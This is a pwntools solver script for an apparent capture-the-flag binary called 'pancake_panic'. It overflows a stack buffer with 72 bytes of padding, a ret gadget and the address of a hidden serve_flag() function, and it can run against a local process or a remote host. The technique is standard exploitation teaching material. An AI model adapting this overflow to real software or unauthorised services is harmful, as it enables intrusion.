#!/usr/bin/env python3
#
# PANCAKE PANIC — Ret2win solver
#
# This script demonstrates a simple stack buffer overflow against the
# `pancake_panic` binary. It works both locally and against the
# provided Docker service. The exploit consists of padding up to the
# saved return address and then overwriting that address with a short
# `ret` gadget followed by the address of the hidden `serve_flag()`
# function.

import sys
from pwn import *  # type: ignore


BINARY = './pancake_panic'
RIP_OFFSET = 72  # 64 bytes for the buffer + 8 bytes for saved RBP

elf = ELF(BINARY, checksec=False)
rop = ROP(elf)

context.binary = elf
context.log_level = "debug" if "DEBUG" in sys.argv else "info"

# Resolve the address of serve_flag(). Even though the function is
# static, its symbol is present in the non‑stripped binary produced by
# `make`. If the binary is stripped, the address will still be correct
# as long as it was compiled from the same source because PIE is
# disabled and code addresses are fixed.
WIN = elf.symbols.get("serve_flag")
if not WIN:
    log.warning("serve_flag() symbol not found; using known offset")
    # Fallback: update this constant if the binary is rebuilt.
    WIN = 0x4012c2

# Find a single‑instruction ret gadget. This improves reliability on
# some systems by ensuring 16‑byte stack alignment before calling
# serve_flag().
try:
    RET = rop.find_gadget(["ret"]).address
except Exception:
    # Fallback to a hard‑coded gadget if automatic discovery fails.
    RET = 0x40101a


def get_tube():
    """Return a Pwntools tube to either a local process or a remote service."""
    if "REMOTE" in sys.argv:
        try:
            idx = sys.argv.index("REMOTE")
            host = sys.argv[idx + 1]
            port = int(sys.argv[idx + 2])
        except (IndexError, ValueError):
            log.error("Usage: python3 solve.py REMOTE <host> <port>")
            sys.exit(1)

        log.info(f"Connecting to {host}:{port}")
        return remote(host, port)

    # Default to a local process. Pass a minimal PATH so that libc
    # behaves identically to the remote environment.
    log.info(f"Spawning local process: {BINARY}")
    return process(
        BINARY,
        env={"PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"},
    )


def build_payload():
    """Construct the overflow payload."""
    payload = flat(
        b"A" * RIP_OFFSET,  # fill buffer and saved RBP
        RET,
        WIN,
    )

    log.info(f"saved RIP offset : {RIP_OFFSET}")
    log.info(f"ret gadget       : {hex(RET)}")
    log.info(f"serve_flag()     : {hex(WIN)}")
    log.info(f"payload size     : {len(payload)}")

    return payload


def find_offset():
    """Print a cyclic pattern for manual offset discovery under GDB."""
    pattern = cyclic(200)
    log.info("Send this pattern under GDB and inspect the overwritten return value:")
    print(pattern.decode())


def exploit():
    """Run the exploit and print the program's output."""
    p = get_tube()

    # Synchronise with the program's prompt. It leaks the buffer
    # address as a stack leak, which we read and discard. We wait for
    # the final prompt "[>]" that precedes the read() call.
    p.recvuntil(b"address : ")
    leak = p.recvline().strip()
    log.info(f"stack leak       : {leak.decode(errors='ignore')}")

    p.recvuntil(b"[>]")
    payload = build_payload()
    p.send(payload)

    output = p.recvall(timeout=2)
    print(output.decode("latin-1", errors="replace"))


if __name__ == "__main__":
    print()
    print("  PANCAKE PANIC — ret2win solver")
    print(f"  saved RIP offset : {RIP_OFFSET}")
    print(f"  serve_flag()     : {hex(WIN)}")
    print()

    if "FIND_OFFSET" in sys.argv:
        find_offset()
    else:
        exploit()